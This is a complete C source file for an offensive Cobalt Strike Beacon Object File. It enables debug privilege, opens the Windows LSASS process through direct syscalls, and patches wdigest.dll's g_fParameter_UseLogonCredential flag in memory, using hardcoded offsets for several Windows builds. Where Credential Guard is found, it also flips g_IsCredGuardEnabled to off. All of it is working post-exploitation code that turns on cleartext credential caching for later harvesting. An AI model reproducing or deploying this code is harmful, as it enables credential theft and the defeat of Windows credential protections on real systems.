#include <Windows.h>
#include <stdio.h>

#include "WdToggle.h"
#include "Syscalls.h"
#include "beacon.h"


// Open a handle to the LSASS process
HANDLE GrabLsassHandle(DWORD dwPid) {
	NTSTATUS status;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
	uPid.UniqueThread = (HANDLE)0;

	status = ZwOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &ObjectAttributes, &uPid);
	if (hProcess == NULL) {
		return NULL;
	}

	return hProcess;
}

// Read memory from LSASS process
SIZE_T ReadFromLsass(HANDLE hLsass, LPVOID pAddr, LPVOID pMemOut, SIZE_T memOutLen) {
	NTSTATUS status = 0;
	SIZE_T bytesRead = 0;
 	 
	MSVCRT$memset(pMemOut, 0, memOutLen);

	status = ZwReadVirtualMemory(hLsass, pAddr, pMemOut, memOutLen, &bytesRead);
	if (status != STATUS_SUCCESS) {
		return 0;
	}

	return bytesRead;
}

// Write memory to LSASS process
SIZE_T WriteToLsass(HANDLE hLsass, LPVOID pAddr, LPVOID memIn, SIZE_T memInLen) {
	NTSTATUS status = 0;
	SIZE_T bytesWritten = 0;

	status = ZwWriteVirtualMemory(hLsass, pAddr, memIn, memInLen, &bytesWritten);
	if (status != STATUS_SUCCESS) {
		return 0;
	}

	return bytesWritten;
}

BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_offSet, BOOL bCredGuardEnabled, DWORD64 credGuardEnabled_offset) {
	ULONG ulNewLogonValue = 1, ulNewCredGuardValue = 0;
	ULONG ulCurLogonValue, ulCurCredGuardValue;
	SIZE_T sResult = 0;

	LPVOID pAddrOfUseLogonCredentialGlobalVariable = (PUCHAR)scWdigestMem + logonCredential_offSet;
	LPVOID pAddrOfIsCredGuardEnabledGlobalVariable = (PUCHAR)scWdigestMem + credGuardEnabled_offset;

	BeaconPrintf(CALLBACK_OUTPUT, "[*] g_fParameter_UseLogonCredential at 0x%p\n", pAddrOfUseLogonCredentialGlobalVariable);
	if (bCredGuardEnabled) {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] g_IsCredGuardEnabled at 0x%p\n", pAddrOfIsCredGuardEnabledGlobalVariable);
	}

	// Read current value of wdigest!g_fParameter_useLogonCredential
	sResult = ReadFromLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulCurLogonValue, sizeof(ULONG));
	if (sResult == 0) {
		return FALSE;
	}

	if (ulCurLogonValue == 1) {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] UseLogonCredential already enabled\n\n");
		return TRUE;
	}
	else if (ulCurLogonValue != 0) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Unexpected g_fParameter_UseLogonCredential value (possible offset mismatch?)\n\n");
		return FALSE;
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Current value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);	
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Toggling g_fParameter_UseLogonCredential to 1 in lsass.exe\n");
	}

	sResult = WriteToLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulNewLogonValue, sizeof(ULONG));
	if (sResult == 0) {
		return FALSE;
	}

	// Read new value of wdigest!g_fParameter_useLogonCredential
	ReadFromLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulCurLogonValue, sizeof(ULONG));
	BeaconPrintf(CALLBACK_OUTPUT, "[*] New value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);

	if (bCredGuardEnabled && credGuardEnabled_offset != 0) {
		// Read current value of wdigest!g_IsCredGuardEnabled
		sResult = ReadFromLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulCurCredGuardValue, sizeof(ULONG));
		if (sResult == 0) {
			return FALSE;
		}

		if (ulCurCredGuardValue == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] IsCredGuardEnabled already disabled\n\n");
			return TRUE;
		}
		else if (ulCurCredGuardValue != 1) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Error: Unexpected g_IsCredGuardEnabled value (possible offset mismatch?)\n\n");
			return FALSE;
		}
		else {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Current value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);	
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Toggling g_IsCredGuardEnabled to 0 in lsass.exe\n");
		}

		sResult = WriteToLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulNewCredGuardValue, sizeof(ULONG));
		if (sResult == 0) {
			return FALSE;
		}

		// Read new value of wdigest!g_IsCredGuardEnabled
		ReadFromLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulCurCredGuardValue, sizeof(ULONG));
		BeaconPrintf(CALLBACK_OUTPUT, "[*] New value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[*] Done... WDigest credential caching should now be on\n\n");

	return TRUE;
}

HANDLE OpenRegKeyHandle(INT DesiredAccess, PUNICODE_STRING RegistryKeyName) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE regKeyHandle = NULL;

	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, RegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = ZwOpenKey(&regKeyHandle, DesiredAccess, &ObjectAttributes);
	if (Status != STATUS_SUCCESS) {
		return NULL;
	}

	return regKeyHandle;
}

// Read UBR (Update Build Revision) from registry
DWORD ReadUBRFromRegistry() {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE regKeyHandle = NULL;
	UNICODE_STRING RegistryKeyName;	
	UNICODE_STRING KeyValueName;
	PKEY_VALUE_FULL_INFORMATION KeyValueInformation = NULL;
	ULONG KeyResultLength = 0;
	DWORD dwValueData = 0;

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return 0;
	}

	RtlInitUnicodeString(&RegistryKeyName, L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion");
	RtlInitUnicodeString(&KeyValueName, L"UBR");

	regKeyHandle = OpenRegKeyHandle(KEY_QUERY_VALUE, &RegistryKeyName);
	if (regKeyHandle == NULL) {
		return 0;
	}

	Status = ZwQueryValueKey(regKeyHandle, &KeyValueName, KeyValueFullInformation, NULL, 0, &KeyResultLength);
	if (Status != STATUS_BUFFER_TOO_SMALL) {
		goto CleanUp;
	}

	KeyValueInformation = (PKEY_VALUE_FULL_INFORMATION)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, KeyResultLength);
	Status = ZwQueryValueKey(regKeyHandle, &KeyValueName, KeyValueFullInformation, KeyValueInformation, KeyResultLength, &KeyResultLength);
	if (Status != STATUS_SUCCESS) {
		goto CleanUp;
	}

	dwValueData = *((DWORD*)((PUCHAR)&KeyValueInformation[0] + KeyValueInformation[0].DataOffset));

CleanUp:

	if (regKeyHandle != NULL) {
		ZwClose(regKeyHandle);
	}

	if (KeyValueInformation != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, KeyValueInformation);
	}

	return dwValueData;
}

// Searches for lsass.exe PID
DWORD GetLsassPid(LPCWSTR lpwLsass) {
	NTSTATUS status;
	LPVOID pBuffer = NULL;
	DWORD dwPid = 0;
	ULONG uReturnLength = 0;
	SIZE_T uSize = 0;
	PSYSTEM_PROCESSES pProcInfo = NULL;

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return 0;
	}

	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlEqualUnicodeString");
	if (RtlEqualUnicodeString == NULL) {
		return 0;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
	if (!(status == STATUS_INFO_LENGTH_MISMATCH)) {
		return 0;
	}

	uSize = uReturnLength;
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		return 0;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
	if (status != STATUS_SUCCESS) {
		status = ZwFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
		return 0;
	}

	UNICODE_STRING uLsass;
	RtlInitUnicodeString(&uLsass, lpwLsass);

	pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
	do {
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &uLsass, TRUE)) {
			dwPid = (DWORD)(DWORD_PTR)pProcInfo->ProcessId;
			goto CleanUp;
		}

		if (pProcInfo->NextEntryDelta == 0) {
			break;
		}

	} while (pProcInfo);

CleanUp:

	if (pBuffer != NULL) {
		ZwFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
	}

	return dwPid;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	NTSTATUS status = ZwOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	LPCWSTR lpwPriv = L"SeDebugPrivilege";
	if (!ADVAPI32$LookupPrivilegeValueW(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		ZwClose(hToken);
		return FALSE;
	}

	status = ZwAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (status != STATUS_SUCCESS) {
		ZwClose(hToken);
		return FALSE;
	}

	ZwClose(hToken);

	return TRUE;
}


VOID go(IN PCHAR Args, IN ULONG Length) {
	HANDLE hLsass = NULL;
	HMODULE* hLsassDll = NULL;
	DWORD bytesReturned;
	DWORD cbNeeded;
	CHAR modName[MAX_PATH];
	LPSTR wdigest = NULL;
	BOOL bCredGuardEnabled = FALSE;
	DWORD64 logonCredential_offSet = 0;
	DWORD64 credGuardEnabled_offset = 0;
	DWORD dwResult = 0;

	WCHAR chOSMajorMinor[8];
	DWORD dwUBR = 0;
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;
	DWORD dwLsassPID = 0;
	DWORD dwLsaIsoPID = 0;


	pTIB = (PNT_TIB)GetTEBAsm64();

	pTEB = (PTEB)pTIB->Self;
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL) {
		return;
	}

	MSVCRT$swprintf_s(chOSMajorMinor, sizeof(chOSMajorMinor), L"%u.%u", pPEB->OSMajorVersion, pPEB->OSMinorVersion);
	
	// Read UBR value from registry (we don't want to screw up lsass)
	dwUBR = ReadUBRFromRegistry();
	if (dwUBR != 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "Windows version: %ls, OS build number: %u.%u\n", chOSMajorMinor, pPEB->OSBuildNumber, dwUBR);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "Windows version: %ls, OS build number: %u\n", chOSMajorMinor, pPEB->OSBuildNumber);
	}

	// Offsets for wdigest!g_fParameter_UseLogonCredential (here you can add offsets for additional OS builds/revisions)
	// C:\Program Files (x86)\Windows Kits\10\Debuggers\x64>cdb.exe -z C:\Windows\System32\wdigest.dll
	// 0:000>x wdigest!g_fParameter_UseLogonCredential
	// 0:000>x wdigest!g_IsCredGuardEnabled
	if (MSVCRT$_wcsicmp(chOSMajorMinor, L"6.3") == 0 && pPEB->OSBuildNumber == 9600 && dwUBR >= 19747) { // 8.1 / W2k12 R2
		logonCredential_offSet = 0x33040;
	}
	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 14393 && dwUBR >= 3686) { // v1607
		logonCredential_offSet = 0x35dc0;
		credGuardEnabled_offset = 0x35ba8;
	}
	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 17763 && dwUBR >= 1457) { // v1809
		logonCredential_offSet = 0x36114;
		credGuardEnabled_offset = 0x35b88;
	}
	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 18362 && dwUBR >= 1110) { // v1903
		logonCredential_offSet = 0x36124;
		credGuardEnabled_offset = 0x35b88;
	}
	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 18363 && dwUBR >= 1110) { // v1909
		logonCredential_offSet = 0x36124;
		credGuardEnabled_offset = 0x35b88;
	}
	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 19041 && dwUBR >= 572) { // v2004
		logonCredential_offSet = 0x361b4;
		credGuardEnabled_offset = 0x35c08;
	}
	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 19042 && dwUBR >= 630) { // v20H2
		logonCredential_offSet = 0x361b4;
		credGuardEnabled_offset = 0x35c08;
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "[!] OS Version/build/revision not supported\n");
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[*] Enable SeDebugPrivilege\n");
	if (!SetDebugPrivilege()) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to enable SeDebugPrivilege\n");
		return;
	}

	dwLsassPID = GetLsassPid(L"lsass.exe");
	if (dwLsassPID != 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Lsass PID is: %u\n", dwLsassPID);
	}
	else{
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to obtain to lsass PID\n");
		return;
	}

	if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber >= 14393) {
		dwLsaIsoPID = GetLsassPid(L"lsaiso.exe");
		if (dwLsaIsoPID != 0) {
			bCredGuardEnabled = TRUE;
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Credential Guard enabled, LsaIso PID is: %u\n", dwLsaIsoPID);
		}
	}

	hLsass = GrabLsassHandle(dwLsassPID);
	if (hLsass ==  NULL || hLsass == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Could not open handle to lsass process\n");
		goto CleanUp;
	}

	if(!PSAPI$EnumProcessModules(hLsass, 0, 0, &cbNeeded)){
        BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to enumerate modules\n");
		goto CleanUp;
	}

	hLsassDll = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbNeeded);
	if (hLsassDll == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to allocate modules memory\n");
		goto CleanUp;
	}

	// Enumerate all loaded modules within lsass process
	if (PSAPI$EnumProcessModules(hLsass, hLsassDll, cbNeeded, &bytesReturned)) {
		for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
			PSAPI$GetModuleFileNameExA(hLsass, hLsassDll[i], modName, sizeof(modName));
			if (MSVCRT$strstr(modName, "wdigest.DLL") != (LPSTR)NULL) {
				wdigest = (LPSTR)hLsassDll[i];
				break;
			}
		}
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: No modules in LSASS :(\n");
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: %d\n", KERNEL32$GetLastError());
	}

	// Make sure we have all the DLLs that we require
	if (wdigest == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Could not find all DLL's in LSASS :(\n");
		goto CleanUp;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[*] wdigest.dll found at 0x%p\n", wdigest);

	if (!ToggleWDigest(hLsass, wdigest, logonCredential_offSet, bCredGuardEnabled, credGuardEnabled_offset)) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Could not patch g_fParameter_UseLogonCredential\n");
		goto CleanUp;
	}

CleanUp:

	if (hLsass != NULL) {
		ZwClose(hLsass);
	}

	if (hLsassDll != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, hLsassDll);
	}

	return;
}
